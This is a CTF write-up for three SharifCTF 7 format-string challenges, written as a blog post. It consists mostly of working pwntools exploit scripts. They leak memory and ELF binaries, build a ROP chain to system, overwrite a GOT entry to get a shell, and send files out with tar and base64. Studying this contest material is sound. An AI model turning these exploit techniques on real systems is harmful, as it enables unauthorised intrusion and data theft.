---
title: 'SharifCTF 7: Guess (pwn 50), Persian (pwn 150), NoMoreBlind (pwn 200)'
date: 2016-12-18 00:00:00 Z
categories:
- writeup
tags:
- cat/pwn
- tool/pwntools
- vuln/fmtstr
layout: post
author: f0rki
---

## Format Strings Everywhere

The first three pwn challenges were all about format strings. They are very
similar as they all basically do nothing more than:

```c
char buf[N];
fgets(&buf, N, stdin);
printf(buf);
```

...and differ only in some minor details. We weren't given any binaries for the
challenges so it was rather hard to exploit this obvious bugs, because we had 
neither the binary or the libc.


## Write-up Guess

This one was pretty easy. The flag was stored on the stack. With a little
python and pwntools scripting we can easily dump the stack contents and just
read the flag.

```python
#!/usr/bin/env python

from pwn import *  # NOQA

vp = remote("ctf.sharif.edu", 54517)


def dump_stack(at=None, n=2048):
    pl = ""
    if at:
        for i in range(n // 8):
            pl += "%{}$p.".format(at + i)
    else:
        pl = ".%p" * (n // 8)
    vp.sendline(pl)
    vp.readline()
    x = vp.readline().strip().strip(".")
    stack_leak = x.split(".")[1:]
    stack_leak = map(lambda y: 0 if "nil" in y else int(y, 16), stack_leak)
    return stack_leak


sl = dump_stack()
# log.info("\n".join(map(hex, sl)))
slb = "".join(map(p64, sl))
log.info(hexdump(slb))

x = slb[slb.find("SharifCTF{"):]
x = x[:(x.find("}") + 1)]
log.info("flag is:\n" + x)

vp.close()
```

Done.


## Write-Up Persian

This time we can only input two format strings before the program exits. This
was super annoying. There really wasn't anything in particular obvious on the
stack. A couple of things that looked like stack pointers and code pointers. I
tried reading out a couple of strings I found, but didn't find anything useful.
So I started leaked the whole ELF file from the address space. Since it's a
64-bit binary (observable by looking at `%p` modifier) we can start leaking at
`0x400000`. Also there isn't anything that will change between the runs in the
code segment so we can open as many connections as we want.

Unfortunately because every two format strings we have to open a new
connection, so leaking the ELF took ages. Also I had a couple of issues and it
took me quite a while to get a proper leak. In the end I managed to dump a half
broken ELF file, which was loadable in radare, but somehow lacked the names
of the imported functions.

```python
def fmtleaker(addr):
    log.debug("leaking addr 0x{:x}".format(addr))
    vp = None
    for i in range(3):
        try:
            vp = remote("ctf.sharif.edu", 54514, timeout=1)
            pl = "ABCD%10$sDCBA"
            pl += "\x00" * 3
            pl += p64(addr)
            if "\n" in pl:
                log.warning("newline in payload!")
                return None
            vp.sendline(pl)
            x = vp.recv()
            if x:
                f = x.find("ABCD") + 4
                l = x.find("DCBA")
                res = x[f:l]
                if res == "":
                    return "\x00"
                else:
                    return res

            return None
        except KeyboardInterrupt:
            raise
        except EOFError:
            log.debug("got EOF for leaking addr 0x{:x}".format(addr))
            pass
        except Exception:
            log.warning("got exception...", exc_info=sys.exc_info())
        finally:
            if vp:
                vp.close()
    return None


base_addr = 0x400000

leaked = ""

with open("./out.elf") as f:
    leaked = f.read()

import gc

try:
    while len(leaked) < 32000:
        addr = base_addr + len(leaked)
        x = fmtleaker(addr)
        if x:
            leaked += x
        else:
            leaked += "\xff"
        log.info(hexdump(leaked))

        if len(leaked) % 128 == 0:
            log.info("saving in the middle")
            gc.collect()
            with open("out.elf", "wb") as f:
                f.write(leaked)
            gc.collect()

    log.info(hexdump(leaked))
finally:
    with open("out.elf", "wb") as f:
        f.write(leaked)
```


I noticed something fishy in the main function:

```
0x00400808      488b15b90420.  mov rdx, qword [0x00600cc8] ; probably stdin
0x0040080f      488d85f0f7ff.  lea rax, [rbp - local_810h] ; <-- fishy here
0x00400816      be00090000     mov esi, 0x900              ; this looks like a buffer overflow
0x0040081b      4889c7         mov rdi, rax
0x0040081e      e8fdfdffff     call fgets
```

The buffer is at `ebp - 0x810` but `fgets` is called with a length of 0x900. 
So we have a stack based buffer overflow. It doesn't look like there are stack
canaries. I whipped up a quick ROP chain that 

- leaks two address from the GOT (`fgets` and `setvbuf`)
- calls main again

Then I tried to look up the offset of the two functions in various libc
databases to find the offset of system, but had no luck.

But we can use the `DynELF` feature of pwntools, which searches the
datastructures of the dynamic linker to lookup symbols, given a reliable info 
leak.

Since we can only input two format strings and opening up a new connection will
probably randomize the addresses again, we have to construct a reliable info
leak first. We can do this with the buffer overflow in the main function. 

1. perform info leak with the format string vulnerability
2. overwrite return address of `main` with the start of `main` to create a loop

Using this we can leak as many bytes as we want.

```python
@pwnlib.memleak.MemLeak.NoNewlines
def fmtleak(addr):
    log.debug("leaking addr 0x{:x}".format(addr))
    pl = "ABCD%10$sDCBA"
    pl += "\x00" * 3
    pl += p64(addr)
    if "\n" in pl:
        log.warning("newline in payload!")
        return ""
    vp.sendline(pl)
    x = vp.recv()
    if x:
        f = x.find("ABCD") + 4
        l = x.find("DCBA")
        res = x[f:l]
        if res == "":
            res = "\x00"

    pad = "\x00" + "A" * (0x810 - 1)
    pl = pad
    pl += p64(0xdeadc0de)
    pl += p64(main)
    vp.sendline(pl)

    return res

printf_leaked = fmtleak.q(printf_got)
log.info("printf 0x{:x}"
         .format(printf_leaked))

de = DynELF(fmtleak, printf_leaked)

# puts = de.lookup("puts", "libc")
system = de.lookup("system", "libc")

log.info("system: 0x{:x}".format(system))
# log.info("puts: 0x{:x}".format(puts))
```

With this we had the offset from system to printf (which we can leak much more
easily via the GOT) and allowed us to construct a reliable ROP exploit.

```python

system = printf_leaked - 0xf860

vp.sendline("\x00")

pad = "wat\x00"
pad += "A" * (0x810 - 4)
pl = pad
# rop by hand, because pwntools ELF can't load the leaked one
pl += p64(0xdeadc0de)
pl += p64(0x004008e3)  # pop rdi
pl += p64(0x004003cf)  # sh string
# pl += p64(puts)
pl += p64(system)
pl += p64(main)

if "\n" in pl:
    log.warning("newlines!!!\n" + hexdump(pl))

with context.local(log_level="debug"):
    vp.sendline(pl)
    vp.sendline("id;pwd;ls -al")

vp.recv()

vp.sendline("cat /home/rooney/suctf/Persian/persian | base64")

vp.sendline("cat /home/rooney/suctf/Persian/flag")

vp.interactive()

log.info("leaking libc for later uses...")

with context.local(log_level="debug"):
    vp.sendline("tar cz /lib/x86_64-linux-gnu/libc-2.19.so | base64; sleep 1; exit")

with open("./libc.so.tar.gz.leaked.b64", "ab") as f:
    i = 0
    x = vp.recv(8128, timeout=0.5)
    while x:
        i += len(x)
        log.info("received {} bytes".format(i))
        f.write(x)
        x = vp.recv(8128, timeout=0.5)

vp.close()
```


## Write-Up NoMoreBlind

This time we have a 32-bit binary and can input unlimited format strings. Other
than that it's again basically the same.

1. Leak the ELF via the format string bug.
  - my leaking code got better, so this worked pretty good now
  - `base_addr = 0x08048000`
  - Thre is no RELRO
  - Thre is no buffer overflow anymore
2. Leak the address of system
  - pwntools DynELF reliably identified the libc and gave us a libcdb download link :)
3. Overwrite `printf.got` with the address of `system`
  - The loop in `main` is then basically `fgets(&buf); system(buf);`
4. Enjoy the tasty shell :)

This is a pretty standard format string exploit.

```python
printf_got = 0x0804995c
fflush_got = 0x08049960
fgets_got = 0x08049964
printf_leaked = fmtleaker.d(printf_got)
fgets_leaked = fmtleaker.d(fgets_got)

log.info("printf 0x{:x}".format(printf_leaked))
# log.info("fflush 0x{:x}".format(fflush_leaked))
log.info("fgets 0x{:x}".format(fgets_leaked))

"""
with context.local(log_level='info'):
    de = DynELF(fmtleaker, printf_leaked)

    system0 = de.lookup("system", "libc")
    system = system0
    log.info("found system 0x{:x}".format(system))
"""
# build id: 5ab6a00d805f696b8aa6d0d2ee29d511b41499d1

libc = ELF("./libc-2.19.so")
libc_base = fgets_leaked - libc.symbols["fgets"]
libc.address = libc_base
system = libc.symbols['system']
log.info("found system 0x{:x}".format(system))


target = printf_got

# split system addr in half, for writing with two %hn
target_hi = target + 2
system_hi = (system & 0xffff0000) >> 16
target_lo = target
system_lo = (system & 0xffff)

log.info("system_hi 0x{:x} system_lo 0x{:x}"
         .format(system_hi, system_lo))

o = 14

# debug format string for testing offsets
fmt2 = ""
fmt2 += "%{}$s".format(o)
fmt2 += "\xff"
fmt2 += "%{}$s".format(o + 1)
fmt2 += "\xff"
fmt2 += "\x00" * (28)
fmt2 += p32(target_lo)
fmt2 += p32(target_hi)

log.info(hexdump(fmt2))
vp.sendline(fmt2)

vp.recvline()
log.info(hexdump(vp.recvuntil("\xff")))
log.info(hexdump(vp.recvuntil("\xff")))

# actual format string attack
o = 14
addr_hi = "%{}$hn".format(o + 1)
addr_lo = "%{}$hn".format(o)
if target_lo > target_hi:
    fmt = ""
    fmt += "%1${}c".format(system_hi)
    fmt += addr_hi
    fmt += "%1${}c".format(system_lo - system_hi)
    fmt += addr_lo
else:
    fmt = ""
    fmt += "%1${}c".format(system_lo)
    fmt += addr_lo
    fmt += "%1${}c".format(system_hi - system_lo)
    fmt += addr_hi

fmt += "\xff%{}$s\xff".format(o)
# fmt += "\x00" * (len(fmt) % 4)
fmt += "\x00" * 3
fmt += p32(target_lo)
fmt += p32(target_hi)

log.info("fmt payload len = {}\n{}\n{}".format(len(fmt), repr(fmt), hexdump(fmt)))
assert len(fmt) % 4 == 0
if "\n" in fmt:
    log.error("newlines in formatstr:\n" + hexdump(fmt))


# vp.interactive()

vp.sendline(fmt)

i = 0
full = (max([system_lo, system_hi]))
with context.local(log_level='info'):
    prog = log.progress("reading back fmt")
    while i < full:
        x = vp.recv(8096, timeout=0.2)
        i += len(x)
        prog.status("{} / {}".format(i, full))
    prog.success("done")

log.info("last block:\n" + hexdump(x))

vp.sendline("/bin/sh")
vp.sendline("id;pwd;ls -al")

vp.sendline("cd /home/rooney/suctf/NoMoreBlind")
vp.sendline("cat flag")

vp.interactive()

vp.sendline("cd /home/rooney/suctf/NoMoreBlind")
vp.sendline("tar cz . | base64; exit")

l = ""
x = vp.recv(8096, timeout=0.5)
l = x
while x:
    x = vp.recv(8096, timeout=0.5)
    l += x

with open("./nomore.leaked.tar.gz.b64", "wb") as f:
    f.write(l)
```

